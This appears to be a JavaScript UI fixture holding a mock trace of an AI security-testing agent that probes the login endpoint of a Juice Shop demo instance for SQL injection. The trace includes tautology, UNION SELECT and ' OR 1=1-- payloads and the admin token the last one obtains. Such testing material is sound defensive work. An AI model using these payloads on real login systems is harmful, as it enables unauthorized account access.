/**
 * Mock execution trace until backend executionTrace is wired.
 */

function joinParagraphs(...parts) {
    return parts.filter(Boolean).join('\n\n');
}

function formatPlanStep({ attempt, payload }) {
    if (attempt === 1) {
        return joinParagraphs(payload);
    }
    return joinParagraphs(
        `Planning the ${['second', 'third', 'fourth', 'fifth'][attempt - 2] || `${attempt}th`} request only, based on attempt ${attempt - 1}.`,
        payload
    );
}

function buildMockExecutionTraceEvents() {
    return [
        {
            id: 'e1',
            phase: 'THINKING',
            content: joinParagraphs(
                'Starting a new smart-test run on this result. I have one captured login: POST /rest/user/login with JSON email and password.',
                'Nothing has been sent yet. I need to decide what to try first, not map out later attempts before I see a response.',
                'First guess: email is concatenated into SQL. I will probe that field before touching password.'
            ),
        },
        {
            id: 'e2',
            phase: 'PLAN',
            attempt: 1,
            content: formatPlanStep({
                attempt: 1,
                payload:
                    "Send a boolean tautology in the email field: victim@gmail.com' OR '1'='1. Keep password as the sample value (victim123) so the only variable is email.",
            }),
        },
        {
            id: 'e3',
            phase: 'ACTION',
            attempt: 1,
            requestSummary:
                "POST /rest/user/login | email: victim@gmail.com' OR '1'='1 | password: victim123",
            content:
                'Executing the plan above. Replaying browser-like headers and cookies from the sample so the path matches real traffic (x-akto-agent: 1).',
        },
        {
            id: 'e4',
            phase: 'OBSERVATION',
            attempt: 1,
            statusCode: 401,
            content: joinParagraphs(
                'Result for attempt 1: HTTP 401. Body says "Invalid email or password." No JWT, no authentication JSON, no Set-Cookie for a session.',
                'Failed login with a normal error message. Input likely reached the query; session not issued.'
            ),
        },
        {
            id: 'e5',
            phase: 'REASONING',
            attempt: 1,
            content: joinParagraphs(
                'Attempt 1 did not give a session, but it also did not crash. That usually means the payload was parsed into the query and simply did not match a row the app likes.',
                'I do not know column layout or DB type yet. I will plan exactly one follow-up request next.'
            ),
        },
        {
            id: 'e6',
            phase: 'PLAN',
            attempt: 2,
            content: formatPlanStep({
                attempt: 2,
                payload:
                    "Next send: UNION SELECT on email (' UNION SELECT id, email FROM Users--) with the same password as attempt 1.",
            }),
        },
        {
            id: 'e7',
            phase: 'ACTION',
            attempt: 2,
            requestSummary:
                "POST /rest/user/login | email: ' UNION SELECT id, email FROM Users-- | password: victim123",
            content:
                'Executing attempt 2 per the plan above. Same endpoint and header envelope as attempt 1.',
        },
        {
            id: 'e8',
            phase: 'OBSERVATION',
            attempt: 2,
            statusCode: 500,
            content: joinParagraphs(
                'Result for attempt 2: HTTP 500. JSON error includes SQLITE_ERROR: UNION columns do not have the same number of result columns. Sequelize wrapper in the stack.',
                'Still no session, but this is different from attempt 1: the backend complained about SQL shape, which is a strong injectable signal.'
            ),
        },
        {
            id: 'e9',
            phase: 'REASONING',
            attempt: 2,
            content: joinParagraphs(
                'Attempt 2 confirmed injection reaches SQLite; UNION arity was wrong, so enumerating columns is possible but expensive for this test.',
                'I will not schedule another UNION variant right now. I need one more request plan: a minimal boolean bypass with a comment terminator, which often works when UNION is noisy.'
            ),
        },
        {
            id: 'e10',
            phase: 'PLAN',
            attempt: 3,
            content: formatPlanStep({
                attempt: 3,
                payload:
                    "Next send: email ' OR 1=1-- with password anything. Close the string, force a true OR, and comment out the rest of the WHERE clause.",
            }),
        },
        {
            id: 'e11',
            phase: 'ACTION',
            attempt: 3,
            requestSummary: "POST /rest/user/login | email: ' OR 1=1-- | password: anything",
            content: 'Executing attempt 3 per the plan above.',
        },
        {
            id: 'e12',
            phase: 'OBSERVATION',
            attempt: 3,
            statusCode: 200,
            content: joinParagraphs(
                'Result for attempt 3: HTTP 200. Response body contains authentication.token (JWT) and user fields including admin@juice-sh.op.',
                'This is the first successful session in the run. Behavior changed compared to 401 on attempt 1 and 500 on attempt 2.'
            ),
        },
        {
            id: 'e13',
            phase: 'VALIDATION',
            attempt: 3,
            isVulnerable: true,
            content: joinParagraphs(
                'Checking attempt 3 against the test rule: auth bypass via SQLi on email. Status 200, token present, injection still visible in the submitted email field.',
                'Marking this hit vulnerable and binding Evidence to attempt 3 request/response. No further requests planned for this endpoint in this run.'
            ),
        },
    ];
}

export const MOCK_EXECUTION_TRACE = {
    agent: 'Akto Smart Test Agent',
    runMode: 'Smart Automated Testing',
    endpoint: 'POST https://juiceshop.akto.io/rest/user/login',
    objective: 'SQL injection / authentication bypass on the email field',
    events: buildMockExecutionTraceEvents(),
};
